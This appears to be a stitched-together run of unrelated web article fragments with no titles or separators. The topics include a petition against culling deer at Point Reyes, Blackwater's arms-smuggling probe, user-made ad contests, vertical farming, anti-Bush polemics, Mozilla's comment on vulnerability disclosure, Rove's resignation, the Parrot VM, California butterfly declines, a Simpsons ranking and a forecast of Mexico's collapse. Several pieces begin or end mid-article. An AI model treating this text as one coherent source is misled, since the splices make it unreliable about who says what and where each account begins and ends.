The ugly truth about the National Park Service 's methods was exposed by recently retired Channel Island National Park Superintendent , Tim J. Setnicka , who publicly documented the accepted system of false vilification of targeted animals , purposeful misrepresentation of scientific facts to the public , lack of thorough scientific research , and the inhumane deaths of the animals involved .
The NPS is basing their need to hastily exterminate all the deer on the assumption that the Fallow and Axis Deer are somehow harming the environment and disadvantaging the local population of Black - tailed Deer .
There is , at present , no documentation to support this claim , but rather than making an effort to study the deer , the NPS will simply destroy them .
Read more about the NPS ' inhumane policies .
We Ask The National Park Service To :
Put a halt to their hasty plan of extermination .
Spend time studying the Fallow and Axis Deer and their relationship to the environment .
Adopt a humane management plan based on the constantly - improving science of dart gun contraception .

We Want The Deer To Stay Because :
They have been a valued part of local life for more than 50 years .
They add to the rich diversity of abundant life at the Point Reyes National Seashore .
They can only be seen in a small number of places in America .
They are a strong part of the appeal the Point Reyes National Seashore has to its 2.5 million annual visitors .

Blackwater provides security to US diplomatic staff in Baghdad
Some employees are alleged to have sent over unlicensed weapons and equipment , that could have been used by a group labelled as terrorist by the US .
The North Carolina - based firm said it was not aware of such an investigation .
But it confirmed two members of staff were sacked in August 2005 for stealing company property in the US .
Blackwater was blamed for a Baghdad gunfight in which 11 civilians died last Sunday .
The contractor had its licence to operate in Iraq withdrawn by the Iraqi authorities following the shootout , but resumed limited operations on Friday .
The News and Observer in North Carolina quoted two sources as saying officials were investigating whether any Blackwater staff had shipped weapons , night - vision scopes , armour , gun kits and other equipment to Iraq , without the required permits .
BLACKWATER USA FACTS
Founded in 1997 by a former US Navy Seal Headquarters in North Carolina
One of at least 28 private security companies in Iraq Employs 744 US citizens , 231 third - country nationals , and 12 Iraqis to protect US state department in Iraq Provided protection for former CPA head Paul Bremer Four employees killed by mob in Falluja in March 2004
Profile : Blackwater USA
Anger in Iraq over shooting
The newspaper said that , in January , two former members of staff with the firm had pleaded guilty in Greenville , North Carolina , to weapons charges and the pair were now co-operating with federal investigators .
The allegations of weapons smuggling in Iraq by a North Carolina firm came to light earlier this week in a written statement from the state department 's inspector general , Howard Krongard .
In July , Turkey complained to the US that they had seized American weapons from the outlawed Kurdistan Workers Party ( PKK ) , designated a terrorist organisation by Washington .
Investigators are reportedly attempting to determine if any Blackwater weapons could have been sold on the black market and ended up in the hands of the PKK .
Meanwhile , the Iraqi government was also investigating if Blackwater had been involved in six other violent incidents in Iraq that left at least 10 people dead , according to the Washington Post 's Saturday 's edition .
' Hazy situation '
An Iraqi interior ministry investigation found Blackwater to be " 100 % guilty " of last weekend 's incident in which 11 Iraqi civilians were killed .
Blackwater insists its guards acted in self - defence .
A spokeswoman for the company said on Saturday that they had called in investigators from the Bureau of Alcohol , Tobacco and Firearms after finding two Blackwater employees stealing company property in August 2005 .
The members of staff were dismissed and then criminally prosecuted in connection with offences in the US , said the spokeswoman .
Responding to allegations that Blackwater employees were the subject of an Iraq arms smuggling probe , the spokeswoman told the BBC News website : " We are aware of that report and we have yet to see definitive proof that the firm in question is Blackwater .
" I 'm not saying it 's not , as sometimes these things can happen , but it 's a hazy situation . "
Regarding Saturday 's Washington
Post report , Blackwater said it was based on one - sided information from the Iraqi Ministry of the Interior .
In campaigns that solicit work from the public , the model appears to be quite different — consumers , after all , create the ads .
But , in reality , ad agencies and brand marketers are still doing much of the legwork .
Heinz and Doritos spent months planning their user - generated contests , hiring lawyers to vet them and designing advertisements to promote them .
Then they assigned employees to wade through entries .
“ These contests have nothing to do with cost savings , ” said Jared Dougherty , a spokesman for Frito - Lay , the division of PepsiCo that owns the Doritos brand .
While the winners of the Doritos contest may have spent only $ 12 , Doritos spent about $ 1.3 million on advertising in October , according to estimates from Nielsen Monitor - Plus .
And that was when it was promoting the contest , which invited people to create a 30 - second commercial that would run during the Super Bowl .
Doritos received 1,020 videos and awarded prizes of $ 10,000 to five finalists .
And then Doritos , a unit of the Frito - Lay division of PepsiCo , spent more than $ 8 million on advertising in February when it showed the top five commercials , more than any month in the last two years , according to Nielsen Monitor - Plus .
Other companies are also spending handsomely to present user - generated content to the public .
Last Tuesday , KFC put on a commercial during “ American Idol ” that consisted entirely of clips about KFC that consumers had posted on the Internet — even without a contest .
Heinz , too , says that customers have been making videos starring its bottle long before its contest and posting them on sites like YouTube .
Heinz has run ads for its contest during “ American Idol ” and other television shows ( as well as in large newspapers like The New York Times ) , but it has gone a step further : it has converted all the labels on its bottles and ketchup packets into ads for the contest .
This was a major initiative that involved everything from building new industrial printing plates to timing the shipment of bottles so they would appear on shelves at the beginning of May , said Mr. Ciesinski of Heinz .
And for all of Heinz ’s effort , the interests of many of the contestants lie far outside its own .
Steve Sass , 48 , who taped two Heinz commercials , is running for president as a write - in candidate .
Ed Barry , 34 , writes sketches about a character named Vinny and is trying to get his work noticed .
Some contestants say in interviews that they prefer mustard or mayonnaise .

Would you have ever thought it conceivable to grow vast amounts of produce in the heart of densely populated cities such as Hong Kong , Tokyo or New Delhi ?
A new model for agriculture is proposing just that .
Vertical farming is the latest concept to address the impending crisis in world food production and follows the same methodology that town planners have used for years to cope with growing populations and space limitations ; build up , not out .
Aiming to bring food production to the places where most of the consumption occurs , the concept envisages specially designed skyscrapers that contain multiple levels of viable farmland providing all - year - round food production in a controlled , parasite - free environment .
Indoor food production is certainly not new .
Growers have been producing crops such as tomatoes indoors for years but what makes Vertical Farming unique is the scale and use of never before trialled multi- level design .
The construction of vertical farms will include cutting edge systems such as biogas - fired cogeneration , geothermal heating and cooling , rooftop photovoltaic ( solar power technology ) and water recycling .
Indoor farming has the advantage of being free from climate concerns which can ( and do ) adversely affect conventional farming .
The idea originated from The Vertical Farm Project , lead by Dr Dickson Despommier from Columbia University ’s Department of Environmental Health Sciences .
He engaged students to research and develop alternatives to conventional food production .
The vertical farm is still an entirely theoretical idea that relies heavily on existing technologies that need to be fully developed .
Dr Despommier and his team are seeking funding to improve technology and convert the theory into reality .
Proposed design concepts aim to create a futuristic platform for food production integrated into the urban landscape .
One proposal - the " SkyFarm " by Gordon Graff - envisages a massive 2,700,000 square feet of floor area in downtown Toronto that could produce food for 35,000 people for an entire year and replace 420 hectares of traditional farmland on a 1.32 hectare site .
Innovative designs from Chris Jacobs , Andrew Kranis and Pierre Sartoux , whose " La Tour Vivante " ( Living Tower ) project incorporates underground parking and ground level distribution areas where city dwellers can access the fresh produce grown on the floors above .
There are numerous incentives to further develop the concept of high rise farming .
Is has the potential to reduce the despoliation of our planet by current agricultural practices and may be a viable solution to world hunger .
The enormous cost of transporting food to places in need is a major contributing factor to world hunger .
In areas of Africa where the land is arid and citizens unable to pay for imported produce , vertical farms offer an ideal solution to provide whole communities with ongoing food supplies .
The labor intensive nature of the farming ( as large scale machinery would be unusable in such a space ) would create jobs and boost local economies .
Vertical farming could revolutionize the way we produce food .
This new model may complement , and potentially replace , traditional farming methods and provide food for the world using a fraction of the space .
The fallout from this move to urban centers for food production would mark the end of rolling acres of farmland and move workers to cities to develop new skills .
The long term social and economic impact of this is unknown but the concept certainly has the potential to greatly affect our ecosystems and address issues as large as global hunger .
This is one idea where the sky is truly the limit .

How many times do we , the people of the US , have to go around on this queasy - making merry - go - round of propaganda and militarism before we shout -- enough ! -- then shutdown the whole cut-rate carnival and run the scheming carnies who operate it out of town ?
It is imperative the nation 's citizens begin to apprehend the patterns present in this ceaseless cycle of official deceit and collective pathology .
This republic , or any other , cannot survive , inhabited by a populace with such a slow learning curve .
Over the last three decades , the authoritarian right has risen to create the nation they have been longing for since their humbling by the Watergate scandal .
After being subdued and humiliated by the mechanisms of a free republic , the right has turned the tables -- and subdued and humiliated the republic .
If the trend continues , all but unchallenged and unabated , we might as well replace the torch held aloft by Lady Liberty with a taser .
How could it come to this ?
How did so many US citizens grow so apathetic , oblivious , if not flat - out hostile to the tenets of a free republic ?
The authoritarianism inherent to the structure of multi-conglomerate corporatism is antithetical to the concept of the rights and liberties of the individual .
Most individuals -- bound by a corporation 's secrecy - prone , hierarchical values -- will , over time , lose the ability to display free thinking , engage in civic discourse , and even be able to envisage the notion of freedom .
This is true , from the florescent light - flooded aisles of Wal * Mart to the insular executive offices of Haliburton to the sound stages of CNN and Fox News .
Under the prevailing order , reality , for the laboring class of the corporate state , has become debt slavery ; in contrast , the simulacrum of reality , in which , the striver class exists , is a milieu defined by obsessive careerism .
Under the hegemony of corporatism , freedom might as well be fairy dust .
It only exists in an imaginary land , not the places one arrives by way of one 's morning and evening commute .
In addition , economically , by way of decades of financial chicanery , perpetrated by the nation 's business and political elite , we are eating our seed crop , and the consequences of this harvest of deceit have left the people of the US , intellectually and spiritually malnourished .
As a result , many attempt to sate the keening emptiness and mitigate the chronic unease by gorging themselves on the Junk Food Jesus of End Time mythology , which is a belief system wherein corporeal events and actions ( personal and collective ) have no lasting consequence because even the human body is to be cast aside , like a junk food wrapper , when the cosmic CEO decides to make the earth a part of his heavenly franchise .
Accordingly , the corporate state requires modes of being that evince obliviousness and obedience ( the defining traits of the US consumer ) on the part of the majority of the populace .
Ergo , the rise of both Christian consumerists and the vast apparatus of the right - wing propaganda matrix that dominates news cycles via the electronic mass media .
All coming to pass , as George W. Bush -- the reigning mascot of this fantasyland of infantile omnipotence and instant gratification -- is rocked to sleep by his handlers cooing preposterous tales of how history will place him in the pantheon of those men whose greatness was unrecognized by the shallow and petty minds of their own era .
When , in fact , Bush , whose ruinous wars of aggression , deficit - ballooning tax breaks for the wealthy , and policies of crony capitalism ( that enabled the economy - decimating , easy credit banking scams of the present ) displays the character traits of a man ridden with severe psychological trauma ; his attempts to tamp down immense inner turmoil , by means of his grandiose bearing , his absolute certitude regarding his own infallibility , and his bullying behavior , have resulted in an exteriorizing of his pathologies on a global scale , and this is playing out ugly , for all concerned .
Why do the people of the nation ( for the most part ) slouch , slack - jawed and passive , before this assault upon their collective integrity and personal dignity ?
For generations , the ephemeral dazzle of pop culture paternalism and tabloid Manichaeism , as confabulated by advertising and public relations hacks and corporate news courtesans , has overwhelmed gravitas , history , even self - awareness .
As all the while , shallow opportunists have been elevated to the status of pundits , experts and sages .
Withal , the present system generously rewards those individuals who have mastered the art of impersonating human traits and responses in utterly contrived environments .
As a whole , the majority of the populi have come to garner information about the world at large , and , worse , their own self - image , from a medium where phoniness is a treasured commodity , while authentic human traits and responses are banished to a beggar 's road .
Is it any wonder that the media types who thrive in these artificial settings have come to define authenticity as being only those attributes that appear authentic on television ?
Apropos , if you ask these " media personalities " about the shortcomings and corruption of the present system , they will plead the careerist 's Nuremberg Defense ... of only being a stormtrooper obeisant to the " bottom line . "
Fantasy alert :
One would hope that if one were to descend down a ladder constructed of these layers upon layers of bottom lines , one would arrive in a Hell reserved for those possessed with such shameless cupidity .
Reality redux :
Yet as much as the human heart might yearn for such outcomes , there will never arrive the terrible majesty and bitter reckoning of anything resembling Judgement Day , heralded by celestial trumpets and legions of naked and cowering sinners ; instead , in human affairs , there arises dire exigencies that can no longer be ignored nor explained away .
The arrival of such a moment for the US is nearly at hand .
When a nation manifests a mixture of mass ignorance and official mendacity , in combination with uncheck power emanating from an insular and arrogant elite , a golden age of peace and plenty is as possible as holding a tea dance in a tsunami .
As sure as a village of desperate fools who devour their seed crop , a nation that refuses universal health care to its children -- yet rushes to the aid of its parasitic class of wealthy " speculators " and " investors " from the consequences of their own greed - besotted , fiscal debacles -- is doomed .
This is the classic pattern of collective immolation experienced by a nation when power and privilege is increasingly consolidated in fewer and fewer hands .
In essence , this is the key to the conundrum paralyzing the leadership of the Democratic Party :
In a culture in which an individual 's worth is determined by the degree one can be exploited by the corrupt interests that control both the private and public sector , the public at large has little value to the political establishment ...
That is : other than , every few years , being bamboozled for their votes in the sham spectacles known as the US electoral process , a scam mostly financed , hence controlled , by the aforementioned big money interests .
In sum , this is the reason the Democratic Party feels little allegiance to their base .
In turn , the political classes themselves are only of value to the big money corporate elite , because , by their delivery of staggering amounts of pork , massive tax cuts , and the passage of desired anti-regulatory legislation , they serve as their errand boys .
Moreover , the corporate control of congress is a microcosm of US society as a whole .
Accordingly , the increasingly corporatized , ever more submissive people of the US should be termed , the Whose - Your - Daddy Nation .
Yet , since life does not exist in stasis , within this hierarchy of deceivers and dupes , we will gnaw at one another 's ankles until the whole pathetic pyramid collapses .
All around us , we can feel the shoddy structure starting to sway and buckle .
Axiomatically , the value of the dollar is collapsing like the smooth facade of a con man called - out by a group of wised - up marks .
At present , in the wake of the bust in the housing market , repo men are retracing the tracks of real estate grifters who fleeced legions of wishful thinkers who brought the American dream and now only possess the misery of debt slavery .
One would think the time for insurrection has arrived -- that , at long last , an awakened and enraged public would rise up and foreclose on these reprobates and ne'er - do - wells squatting in the White House and skulking through Congress .
The power and privilege of the corporately controlled elite of Washington should be repossessed like the Lexises of Atlanta real estate agents and the oversized pickup trucks of Tucson contractors , confiscated in the wake of the collapse of the housing market .
Foreclosure signs and repossession notices should festoon the whole of official Washington .
Turn about would be fair play .
Since , the rise of Reaganism , the financial sector has been engaged in selling off the assets of the nation 's public sector to the highest bidders .
It is amazing that , at this point , this klavern of kleptocrats have n't yet torn from the walls and absconded with all the copper plumbing fixtures and fittings on Capitol Hill .
Is a turnaround possible ?
If we wake - up and smell the jackboot .
From the miasma of right - wing media propaganda , to the proliferation of predatory capitalism , to the corruption and cupidity of the prison industrial complex , to the pandemic of police brutality and the trampling of the rights of the accused , to perennial civilian shooting sprees , to the muzzling of descent , to the rise of the national surveillance state , to the use and acceptance of torture as state policy , to the adoption of an unlawful , immoral foreign policy doctrine that promotes policies of perpetual war , one is forced to conclude that bullying , and deferring to bullies , has become the dominate mode of being in the US .
Remedy :
In order to turn this trend around , the people of the US must begin to acquire the anti-authoritarian traits of empathy and engagement .
The gaining of empathy alleviates the pathological need to be a bully , while social and political engagement mitigates feelings of powerlessness that authoritarian bully - boys , such as Bush , Cheney , Giuliani , et al. , exploit .
In short , remedial human lessons for the US population , in general , and for the corporate and political classes , in particular .
Let us start the process by having a period of grief and repentance for the death and suffering that our government , in our name , has inflicted on the people of Iraq .
This should be done as the US begins the process of a complete military withdrawal from their decimated nation , and the bestowing of economic reparations upon the millions of Iraqis who have suffered under the brutal machinations and murderous mayhem unloosed by our country 's contemptible invasion and occupation .
To do so , might save the people of our next target , Iran ( as well as ourselves ) a world of grief .

The military commander in Iraq , Gen. David Petraeus , is to deliver a report to Congress on Monday that could be the most consequential testimony by a wartime commander in more than a generation .
What the country desperately needs is an honest assessment of the war and a clear strategy for extricating American forces from the hopeless spiral of violence in Iraq .
President Bush , however , seems to be aiming for maximum political advantage — not maximum clarity on Iraq ’s military and political crises , which can not be separated from each other .
Mr. Bush , we fear , is n’t looking for the truth , only for ways to confound the public , scare Democrats into dropping their demands for a sound exit strategy , and prolong the war until he leaves office .
At times , General Petraeus gives the disturbing impression that he , too , is more focused on the political game in Washington than the unfolding disaster in Iraq .
That serves neither American nor Iraqi interests .
Mr. Bush , deeply unpopular with the American people , is counting on the general to restore credibility to his discredited Iraq policy .
He frequently refers to the escalation of American forces last January as General Petraeus ’s strategy — as if it were not his own creation .
The situation echoes the way Mr. Bush made Colin Powell — another military man with an overly honed sense of a soldier ’s duty — play frontman at the United Nations in 2003 to make the case that Iraq had weapons of mass destruction .
Mr. Bush cannot once again subcontract his responsibility .
This is his war .
General Petraeus has his own credibility problems .
He overstepped in 2004 when he published an op - ed article in The Washington Post six weeks before the election .
The general — then in charge of training and equipping Iraq ’s security forces — rhapsodized about “ tangible progress ” and how the Iraqi forces were “ developing steadily , ” an assessment that may have swayed some voters but has long since proved to be untrue .
Mike Shaver ( Director of Ecosystem Development at Mozilla ) handed his business card to Robert Hansen ( RSnake ) on Wednesday night at Black Hat .
On it he wrote “ ten f—ing days . ”
When I asked him about it , he said he meant to communicate to Robert that since Mozilla got a recent security update out in only ten days , that there was no reason for Robert to post details of vulnerabilities publicly before a patch was available .
Since we ’re among the most responsive software vendors , security researchers do not have to resort to full disclosure to get us to patch bugs quickly .
Well , whatever he meant , his statement has taken on a life of its own .
Robert posted on his blog , and a bunch of news articles picked it up as a challenge .
This is the official Mozilla word :
This is not our policy .
We do not think security is a game , nor do we issue challenges or ultimatums .
We are proud of our track record of quickly releasing critical security patches , often in days .
We work hard to ship fixes as fast as possible because it keeps people safe .
We hope these comments do not overshadow the tremendous efforts of the Mozilla community to keep the Internet secure .

As he said to the WSJ , he wants to spend more time with this family .
Of course , this is a load of horse puckey -- if he had wanted to spend time with his family , he surely would have done it before his son went to college .
Republicans Think He's a Loser
The Republicans have finally realized he 's a loser .
Mahablog links to a well - timed Atlantic article that lays out Rove 's failures :
Social Security
Faith - based wingnut welfare
Katrina
The 2006 elections
It is quite likely that Republicans have finally realized that if you want support from voters , you need to actually deliver on policies , not just promise to .
But to change the previous " create our own reality " approach to governance , you 'd have to get rid of Rove , because that 's all Rove does .
With one exception .
Republicans Think He's a Loser , Nativist Edition
I said there was one exception to the rule that Rove simply " creates his own reality " and makes policy promises without delivering on those promises .
The exception was supposed to be Latino voters .
That is , Rove really did want to court the Latino vote , rather than just claiming Republicans had Latino support .
The reason is obvious : if Republicans do n't get Latino voters , they 're sunk .
Of course , this conflicts ( and has , in noticeable ways ) with the nativist instincts of the base of the Republican party .
About the only thing , at this point , that could mobilize the Republican base ( and save some Congressional seats , if not the White House ) is to give in to these nativist instincts , and start attacking brown people with gusto .
But I doubt Rove would stick around for that -- he knows the numbers too well .
So it 's possible that Rove is out so the Republicans can turn into the full - fledged racist party they 've always been .
Update : Athenae goes to Freepi-land , so I ( and you ) do n't have to .
And sure enough , they 're thrilled to see Rove and his Latino - friendly ways gone .
The Sheriff Is Coming
Several times in the WSJ coverage of Rove 's resignation , it notes that , Rove was thinking of leaving a year ago :
" I just think it 's time , " he says , adding that he first floated the idea of leaving to Mr. Bush a year ago .
His friends confirm he had been talking about it with others even earlier .

Earlier today I was reading an article about Parrot .
Parrot is , as stated on the project ’s Web site , “ a virtual machine designed to efficiently compile and execute bytecode for dynamic languages .
Parrot currently hosts a variety of language implementations in various stages of completion , including Tcl , Javascript , Ruby , Lua , Scheme , PHP , Python , Perl 6 , APL , and a . NET bytecode translator . ”
So Parrot does sound like an interesting piece of technology .
It ’s understandable how a common runtime for scripting languages could prove beneficial .
But will it ever be a platform suitable for serious , production usage ?
I have my doubts .
Parrot has been under active development for quite some time now .
The initial 0.0.1 release was made on September 10 , 2001 .
During 2007 , we ’ve seen a release every month or so .
So a lot of effort has been put into Parrot over the past six years .
It has surpassed one of the major stumbling blocks with many Open Source projects , in that it has managed to build at least some development momentum .
Unfortunately for its supporters , Parrot has never really seemed to catch on .
I think there are a number of reasons for this .
Stability is probably the first problem .
I do n’t mean “ stability ” in terms of the runtime crashing , or anything of that sort .
I ’m talking about “ concept ” stability .
There has always seemed to be a relatively large amount of change between releases .
While this is good , in that there are improvements being made and new ideas being implemented , this causes problems for users who want to build reliably upon Parrot .
Individuals and businesses often do not , or cannot , invest the time and effort to track a continually - moving target like Parrot .
The language implementations for Parrot , while many in number , have been of limited use .
Looking at the status messages of some of the most promising and practical language implementations shows why this might be the case .
Such messages include :
“ Incomplete – but all examples and test cases are working . ” ( Amber for Parrot )
“ Most of the samples work . ” ( BASIC / compiler )
“ Has been broken for a long time . ” ( BASIC / interpreter )
“ Parser is pretty complete .
Generates PIR for basic Ruby programs ” ( Cardinal , Ruby CVS Head 1.9 implementation )
“ Functioning , all samples working , lacks IO routines ” ( Cola )
“ Working for some simple forms .
Due to some broken features , most of the bootstrapping code has been commented out . ” ( Common Lisp )
“ Functioning for handcrafted test cases .
Loading frozen state is currently broken .
Far from complete . ” ( Parrot m4 )
“ This project has been abandoned .
Any takers ? ” ( Pint , an experimental PHP implementation )
“ Passes nearly 25 % of tcl ’s ( lightly converted ) test suite , using a Test : : More like harness . ” ( Tcl )
So while there are many interesting language implementation projects for smaller or more obscure languages that have reached further stages of completion , the ones that were most likely to be of practical use seem to be lacking .
Now , this is understandable .
Maintaining a suitably complete Ruby , Python , Perl or Tcl implementation is not an easy task at all !
And even if it were possible to come up to speed with the existing implementations , just staying current would be a major undertaking .
The third issue is that Parrot never really seemed to get a powerful backer .
Java has Sun. .NET has Microsoft .
Mono has Novell .
Languages like Python , Perl and Ruby have large user communities , plus numerous business and academic supporters .
While Parrot does have a unique community , as a whole I do n’t know if it has the resources necessary to put together and maintain an effective , usable , multi-language runtime environment .
Having followed the project for some time , I have come to realize that it may never really amount to anything of practical use .
Now , that ’s not to say it ’s useless .
Putting it together has no doubt been an enjoyable task for many of its contributors .
I imagine a small number of people have found a use for it .
While it would be nice if it were to grow beyond that , it ’s not something I expect to happen .
It just does n’t offer what most serious users need .

Where have all the butterflies gone ? /
Last year , surprisingly large numbers of painted ladies migrated through Northern California -- this year , few have shown up 1 / 1 Back to Gallery
Wild fluctuations in California 's winter and spring weather have hurt fragile butterfly populations , causing numbers to fall to the lowest in more than three decades and increasing the concerns of scientists about long - term declines linked to climate change and habitat loss .
UC Davis Professor Arthur Shapiro , considered one of the most prominent butterfly trackers in North America , said Monday he has found fewer butterflies this year than at anytime since he came to California 35 years ago .
" We have a severe depression of butterfly numbers at the lower elevations in Northern California , particularly in the Central Valley .
We do n't know if local populations are extinct or have dropped to low levels that we 're unlikely to detect , " he said .
Shapiro , an entomologist and professor of evolution and ecology , monitors 10 locations from Suisun Marsh to the Sierra Nevada and maintains one of the two largest butterfly databases in the world .
The other is the British Butterfly Monitoring Scheme .
At most of the study sites , he has seen half or less than half the number of species typically present at this time in an average year .
Near Vacaville at Gates Canyon in April 2005 , he found 21 species and 378 individual butterflies .
But last month he counted 10 species and 43 individual butterflies .
Many species already appear to be suffering from a serious long - term decline because of several factors , including changes in climate and loss of habitat , he said .
" This short - term anomaly has really kicked the populations while they 're down and may have accelerated their decline , " said Shapiro .
Species hit hard this year include the sooty wing , the large marble , the mourning cloak , Lorquin 's admiral , the small checkered skipper , the sandhill skipper , the field skipper , the buckeye , the eastern tailed blue , the silvery blue and the migratory painted lady .
This is what Shapiro thinks is happening with many species :
The temperature in the state did n't drop enough to give the butterflies a certain amount of chilling , the cue to end their winter dormancy , be it in the form of larvae , pupae , egg or adult .
They remained dormant and died because they could n't take advantage of the food available during the one week of very warm weather in February in the Bay Area and Central Valley .
The few that might have emerged in March probably died in the cold , wet conditions .
Jessica Hellmann , an assistant professor of entomology at the University of Notre Dame who researches butterflies throughout North America , has reviewed Shapiro 's data and said it is critical in determining long - term changes in butterfly populations .
" We have similar observations for 2006 in California , " Hellman said .
" It is only because Art has 35 years of data that we can say 2006 is bad and is worse than it 's been in a long time .
" Without long - term records , we can't quantify the growing influence of humans on biological diversity . "
Hellmann and other scientists have published studies on checkerspot butterflies , showing , among other findings , that extinctions of two local populations were hastened by increasing variability in rain , a phenomenon predicted by global warming models .
Last year , the orange - and - black painted lady stunned Northern Californians by turning up in a migration of millions , if not billions .
But this year , only a few painted ladies are known to have arrived , and earlier than normal , according to UC Davis scientists .
Painted ladies typically breed once in the late winter in the Mojave Desert , then in the Bay Area and the Central Valley and then in the Pacific Northwest , all in a year 's time as the generations move north .
This year they appeared to have given up trying to breed in the southern deserts because of the unusually dry weather that did n't produce the plants that the butterflies needed in their caterpillar stage , scientists believe .
They flew to Northern California earlier than usual and tried to breed with no apparent success , Shapiro said .
He does n't know yet whether they reached the Pacific Northwest .
" There does n't appear to be any organized migration on the west side of Sierra , " he said , adding that he has seen only one painted lady this year in the Sacramento - Davis area and has received reports of only three others in the area .
But he cautioned that just because they 're not here does n't mean there are n't painted ladies elsewhere .
This particular species typically expands in some areas while contracting in others , he said .
Six feet of snow still blankets parts of the Sierra , so Shapiro has n't been able to count butterflies on the 7,000 - foot Donner Summit or the 9,000 - foot Castle Peak north of Donner Summit .
Over the years , he has found the greatest number of butterfly species -- 115 -- at Donner Summit .
This year 's anomalous late arrival of butterflies goes against the longer - term trend .
Many species this year are running four to six weeks later than normal instead of the three weeks earlier that his long - term data show , he said .
Based on his long - term database , the analysis of 23 species over 31 years found that many of the butterflies are coming out earlier in the spring than in the past .
Shapiro and one of his students , Matt Forister , correlated the earlier appearance with trends in the weather data in the Sacramento - Davis area .
For those species that had a statistically significant earlier appearance , the average shift was 24 days earlier .
Any shift can disrupt the butterflies ' survival .
There 's a synchronicity in nature , and many butterflies need to have certain plants available during a certain time in their life cycle .
Shapiro said that for many years he " pooh - poohed the evidence that butterfly populations were going downhill .
But all that changed in 1999 , when a whole bunch of low - elevation species showed an unmistakable drop - off , and the decline has continued . "
But he remains optimistic that the butterflies will survive .
" Butterflies have been around for 40 or 50 million years , " he said , " so they 've been through it before . "
The painted lady
Painted ladies breed on desert annuals in Death Valley , then migrate north to breed again in the Bay Area and Central Valley .
This year , the dry desert produced few plants , and the butterflies apparently stopped breeding .
Only a few have been seen in Northern California .
Hardest hit species of butterflies
Scientists blame the state 's wild weather in 2006 for the worst year for butterflies in 35 years .
UC
Davis scientists are seeing half or less than half the number of species present at this time in an average year and far fewer individuals .
The mild winter disrupted the lifecyles of some species , and the resulting change in the food supply affected others .
Butterfly species hit the hardest :
Sooty wing
Large marble
Mourning cloak
Lorquin 's admiral
Small checkered skipper
Sandhill skipper
Field skipper
Buckeye
Eastern tailed blue
Silvery blue
Migratory painted lady

10 . The President Wore Pearls ( Season 15 , 2003 )
A parody of Andrew Lloyd Webber ’s Evita .
Lisa replaces Martin as school president , beating Nelson in the election .
The teachers , unhappy with the election result , turn Lisa ’s public against her by eliminating art , gym , and music classes .
The final act ( where the episode loses some steam ) is an homage to the student strikes in Paris in 1968 .
It may seem ludicrous to include anything later than Season 8 in this list , but this one is brilliant .
The musical numbers are astoundingly good , and Lisa ’s comeuppance is so well constructed it harkens back to the golden years of the show ( Seasons 3 through 8 ) .
Great moment :
The students are anxious about President Lisa ’s access to the teacher ’s lounge .
“ Is it true they make fun of students in there ? ” Milhouse asks .
Lisa waves away this suggestion as preposterous , and opens the door to the lounge .
Inside , Groundskeeper Willie is mocking Milhouse : “ Look at me , I ’m Milhouse .
I tuck my T - shirt into me underpants .
I have no friends , so I confide in Willie . ”
9. Krusty Gets Kancelled ( Season 4 , 1993 )
When Krusty is pushed off the air by a new children ’s show starring a talking puppet , Bart and Lisa help Krusty arrange a star - studded comeback special featuring Bette Midler , Luke Perry , Johnny Carson , Hugh Hefner , and the Red Hot Chili Peppers .
( Liz Taylor declines to participate . )
This is Krusty ’s best episode — better than the reunion with his father , or the Bar Mitzvah episode , which won an Emmy much later on .
The incorporation of guest stars as themselves is top - notch , and we get to see the really dark side of Krusty ’s flailing showbiz career .
Hollywood , television , celebrities , and fans are all beautifully skewered here .
Great moment : When Perry , who is Krusty ’s half - brother , pleads to be a part of the show , Krusty imagines shooting him from a cannon into a brick wall .
Later , when Krusty actually does shoot him from a cannon , Perry flies through several buildings , including a sandpaper museum , shouting , “ My face !
My valuable face ! , ” before landing in a pillow factory , which is then demolished .
8. Bart the Murderer ( Season 3 , 1991 )
After a lousy day at school , Bart falls down some stairs and into the hangout of local mobsters , who give him an after - school bartending job .
Principal Skinner disappears after causing problems for Bart at work ; when the mobsters are put on trial for Principal Skinner ’s murder , Bart discovers there is no honor among thieves .
An oldie but a goodie .
Here we ’re introduced to Fat Tony , voiced by Joe Mantegna , who is one of the most reliable recurring guest voices .
This episode makes the cut because of the inspired Mafia satire ( GoodFellas , The Godfather ) and because it goes deeper into Bart ’s ongoing conflict with authority figures .
7. Homer ’s Enemy ( Season 8 , 1997 )
Mr. Burns is touched by a news story about an unfortunate man named Frank Grimes , who suffered terrible hardships as a child but went on to earn a degree in nuclear physics .
Mr. Burns hires him at the nuclear plant , where Homer ’s buffoonery and laziness earn Grimes ’s ire .
Perhaps the darkest Simpsons episode ever .
Grimes works hard , is honest and unselfish ; he is quite literally everything Homer is not .
To see him fail , and ultimately be destroyed , once he enters Homer ’s world is hilarious and satisfying .
Longtime scribe George Meyer once jokingly speculated in an interview that it was after this episode that the show lost its moral grounding .
In my annual new years predictions , I said that the most significant , and surprising , development of 2007 would be the collapse of both Mexico ’s economy and its very existence as a viable Nation - State .
While there has n’t been a spectacular , single event confirming my prediction , there has been a steady erosion on all fronts — with five months left in the year , I ’m not yet willing to push back my prediction of Mexico ’s “ collapse ” to 2008 .
The decline of the Mexican Nation - State is a bellwether for the massively complex network of geopolitical influences sometimes termed above ground factors .
It provides some insight into how symptoms of oil scarcity already being felt in poorer parts of the world will increasingly spill over into our own back yard …
Before I highlight the specific events that are undermining the Mexican Nation - State , let me talk first for a moment about what it means for a Nation - State to collapse , an important topic as it ’s an experience that will become increasingly common over the next decade .
When a Nation - State collapses , the cities do n’t all catch on fire simultaneously whilst roving hoards pillage the countryside and the population starves .
Nation - State collapse is not the apocalypse — it is exactly what it suggests to be : the collapse of the notional union of Nation and State under one central , viable government .
Nation - State collapse also does n’t suggest that there will no longer be Nation - States .
It is my prediction that there will be a Mexico , an Iraq , etc. for quite a long time .
What collapse does mean is that the importance of Nation - States will decline sharply , as they become increasingly ineffectual both domestically and internationally .
Nor does the decline of the Nation - State mean the decline of Nationalism and similar identifying sentiments .
Quite the opposite : as States increasingly fail to care for their constituent Nations , those Nations will become increasingly susceptible to the black shirts and brown shirts of history , but these movements will be increasingly dissociated from States , more similar in organizational model to al - Qa’ida than to Nazi Germany .
( See The New Map , a paper that I presented at the 2006 Yale International Law Conference , for an overview of this notion of the end of the Nation - State )
Mexico ’s Oil Production is Collapsing
Production from Mexico ’s Cantarell field is collapsing , and production from new fields are not making up the difference .
It appears very likely that Mexico has permanently passed its peak oil production .
On top of that , domestic consumption is rising , creating the classic Export Land effect : declining production and rising domestic consumption equal accelerated declines in exports .
Taxes from these export revenues generate the largest share of revenue for the federal government .
Recent reductions in the tax rate that the government applies to PEMEX , the state oil company , shows that this key source of revenue is failing .
